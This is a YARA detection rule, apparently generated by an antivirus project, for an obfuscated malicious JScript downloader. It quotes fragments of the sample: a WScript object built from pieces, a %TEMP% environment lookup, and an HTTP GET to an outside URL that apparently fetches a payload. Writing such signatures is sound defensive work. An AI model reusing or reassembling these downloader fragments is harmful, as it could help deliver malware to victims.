rule sig_20160428_f843e457b22bf0dab9206b3cea2837d3 {
  meta:
    description = "datamaliciousorder - file 20160428_f843e457b22bf0dab9206b3cea2837d3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c0243d61ecca0f3c8bd9c2e50b791caa61e58b0c4c66ac4af678060f6c1a0e4c"

  strings:
    $s1  = "VxcYkdVszAueIxhGvtEhu[PwaEiaTvrFppMutDepMar](\"G\" + \"ET\", \"http://switchright.com/2yshda\", false);" fullword ascii
    $s2  = "function YxePkxGzyNjaIlcSxxQve(XbmFxhYcdEnpNnqXkgZad){TtlEccQpvYxlTpyTuhCqv[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function HghVhdXvkXdxXssJdkHgg() {return TtlEccQpvYxlTpyTuhCqv[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function YxePkxGzyNjaIlcSxxQve(XbmFxhYcdEnpNnqXkgZad){TtlEccQpvYxlTpyTuhCqv[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "var TtlEccQpvYxlTpyTuhCqv = function KghGjfDhvYcxZhfPjePtz() {return TxcOhaNalHbzMfmKavPsr[ApgFofPnwXzjYhgMueQwm](\"WScript\"+\"" ascii
    $s6  = "function DcyUliNojOdcUbwNijGlg(NcrBsmAekJbiCwkGoyFbp, TdmSruDrgEdfTbdPoyIuc){YyeYmaRxjQtaRnmHmaBmk = YyeYmaRxjQtaRnmHmaBmk * 1; " ascii
    $s7  = "return NcrBsmAekJbiCwkGoyFbp - TdmSruDrgEdfTbdPoyIuc;};" fullword ascii
    $s8  = "var TtlEccQpvYxlTpyTuhCqv = function KghGjfDhvYcxZhfPjePtz() {return TxcOhaNalHbzMfmKavPsr[ApgFofPnwXzjYhgMueQwm](\"WScript\"+\"" ascii
    $s9  = "var TxcOhaNalHbzMfmKavPsr = this[\"WScript\"];" fullword ascii
    $s10 = "function HghVhdXvkXdxXssJdkHgg() {return TtlEccQpvYxlTpyTuhCqv[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function HwmSigTioAruGzgZqyDev(){return HtuZrdKyjCkwIuvOejLbo + \"\";};" fullword ascii
    $s12 = "function DcyUliNojOdcUbwNijGlg(NcrBsmAekJbiCwkGoyFbp, TdmSruDrgEdfTbdPoyIuc){YyeYmaRxjQtaRnmHmaBmk = YyeYmaRxjQtaRnmHmaBmk * 1; " ascii
    $s13 = "if (VxcYkdVszAueIxhGvtEhu[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function IomFhiLzkDnqWviGzrXrh() {return ((FovOemMwbVbfLvzQqzObi == true) && (FovOemMwbVbfLvzQqzObi == ZyiClgFdsZwzPfgUqyQrf)) ?" ascii
    $s15 = "function IomFhiLzkDnqWviGzrXrh() {return ((FovOemMwbVbfLvzQqzObi == true) && (FovOemMwbVbfLvzQqzObi == ZyiClgFdsZwzPfgUqyQrf)) ?" ascii
    $s16 = "function IajDmxBhkVblOzqLzgAfm(YvpThcZypQyhBqyPycZjb) {var UmyUlaFteGymGruTmgBrf = (1, 2, 3, 4, 5, YvpThcZypQyhBqyPycZjb); retur" ascii
    $s17 = "var OomDtvQxaVsgKugZplNgk = false;" fullword ascii
    $s18 = "var ZyiClgFdsZwzPfgUqyQrf = false;" fullword ascii
    $s19 = "function PocCepUafVzlSltBmwBao()" fullword ascii
    $s20 = "var FovOemMwbVbfLvzQqzObi = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}